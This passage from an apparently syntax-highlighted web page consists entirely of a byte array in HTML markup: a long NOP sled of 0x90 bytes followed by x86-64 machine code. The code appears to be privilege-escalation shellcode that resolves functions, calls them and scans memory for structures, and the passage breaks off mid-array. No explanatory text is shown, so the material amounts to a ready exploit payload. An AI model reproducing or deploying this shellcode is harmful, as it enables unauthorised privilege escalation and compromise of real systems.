class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,    </span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,    </span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,    </span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x3d</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xeb</span>, <span class="number">0x00</span>, <span class="number">0x55</span>, <span class="number">0x41</span>, <span class="number">0x57</span>,</span><br><span class="line">    <span class="number">0x41</span>, <span class="number">0x56</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xfc</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x35</span>, <span class="number">0xfd</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6a</span>, <span class="number">0x0d</span>, <span class="number">0x5a</span>, <span class="number">0xe8</span>, <span class="number">0x85</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>, <span class="number">0x84</span>, <span class="number">0x71</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc3</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x8d</span>, <span class="number">0x35</span>, <span class="number">0xef</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6a</span>, <span class="number">0x14</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>,</span><br><span class="line">    <span class="number">0xe8</span>, <span class="number">0x67</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>, <span class="number">0x84</span>, <span class="number">0x53</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x63</span>, <span class="number">0x2b</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xdd</span>, <span class="number">0x48</span>, <span class="number">0x63</span>, <span class="number">0x08</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0xc1</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xd1</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x8d</span>, <span class="number">0x35</span>, <span class="number">0xd3</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6a</span>, <span class="number">0x0a</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>,</span><br><span class="line">    <span class="number">0xe8</span>, <span class="number">0x37</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>, <span class="number">0x84</span>, <span class="number">0x23</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc3</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x35</span>, <span class="number">0xbf</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x6a</span>, <span class="number">0x09</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0xe8</span>, <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>, <span class="number">0x84</span>, <span class="number">0x05</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x63</span>, <span class="number">0x0b</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0xd9</span>, <span class="number">0x48</span>, <span class="number">0x63</span>, <span class="number">0x18</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xc3</span>, <span class="number">0x6a</span>, <span class="number">0x01</span>, <span class="number">0x5f</span>, <span class="number">0xff</span>,</span><br><span class="line">    <span class="number">0xd1</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0xff</span>, <span class="number">0xd3</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xc6</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x8d</span>, <span class="number">0x35</span>, <span class="number">0x92</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6a</span>, <span class="number">0x0c</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>,</span><br><span class="line">    <span class="number">0xe8</span>, <span class="number">0xe3</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>, <span class="number">0x84</span>, <span class="number">0xcf</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="number">0x48</span>, <span class="number">0x63</span>, <span class="number">0x18</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x35</span>, <span class="number">0x7d</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6a</span>, <span class="number">0x0c</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0xe8</span>, <span class="number">0xc2</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>, <span class="number">0x84</span>, <span class="number">0xae</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0xdf</span>, <span class="number">0x49</span>, <span class="number">0xb8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xf0</span>,</span><br><span class="line">    <span class="number">0x4c</span>, <span class="number">0x63</span>, <span class="number">0x10</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0xc2</span>, <span class="number">0x49</span>, <span class="number">0x8d</span>, <span class="number">0x8f</span>, <span class="number">0xa0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xfa</span>, <span class="number">0x48</span>, <span class="number">0x39</span>, <span class="number">0xca</span>, <span class="number">0x0f</span>, <span class="number">0x83</span>, <span class="number">0x88</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x02</span>, <span class="number">0x4c</span>, <span class="number">0x39</span>, <span class="number">0xc0</span>, <span class="number">0x73</span>, <span class="number">0x06</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc2</span>,</span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0xeb</span>, <span class="number">0xe9</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0xb0</span>, <span class="number">0x00</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0xc7</span>, <span class="number">0x48</span>, <span class="number">0x39</span>, <span class="number">0xf7</span>, <span class="number">0x73</span>, <span class="number">0xeb</span>, <span class="number">0x48</span>, <span class="number">0x39</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x7f</span>,</span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x75</span>, <span class="number">0xf2</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x74</span>, <span class="number">0x5d</span>, <span class="number">0x6a</span>, <span class="number">0x01</span>, <span class="number">0x41</span>, <span class="number">0x5c</span>,</span><br><span class="line">    <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xc3</span>, <span class="number">0x49</span>, <span class="number">0x39</span>, <span class="number">0xf3</span>, <span class="number">0x73</span>, <span class="number">0x51</span>, <span class="number">0x4d</span>, <span class="number">0x8b</span>, <span class="number">0x0b</span>, <span class="number">0x4d</span>,</span><br><span class="line">    <span class="number">0x39</span>, <span class="number">0xc1</span>, <span class="number">0x72</span>, <span class="number">0x34</span>, <span class="number">0x4c</span>, <span class="number">0x39</span>, <span class="number">0xc8</span>, <span class="number">0x74</span>, <span class="number">0x2f</span>, <span class="number">0x49</span>, <span class="number">0x8d</span>, <span class="number">0x49</span>,</span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x31</span>, <span class="number">0xdb</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xcf</span>, <span class="number">0x48</span>, <span class="number">0x39</span>, <span class="number">0xcf</span>, <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x1f</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x2f</span>, <span class="number">0x4c</span>, <span class="number">0x39</span>, <span class="number">0xfd</span>, <span class="number">0x41</span>, <span class="number">0x0f</span>, <span class="number">0x44</span>, <span class="number">0xd4</span>, <span class="number">0x4c</span>,</span><br><span class="line">    <span class="number">0x39</span>, <span class="number">0xd5</span>, <span class="number">0x41</span>, <span class="number">0x0f</span>, <span class="number">0x44</span>, <span class="number">0xdc</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc7</span>, <span class="number">0x08</span>, <span class="number">0x85</span>, <span class="number">0xdb</span>,</span><br><span class="line">    <span class="number">0x74</span>, <span class="number">0xe2</span>, <span class="number">0x85</span>, <span class="number">0xd2</span>, <span 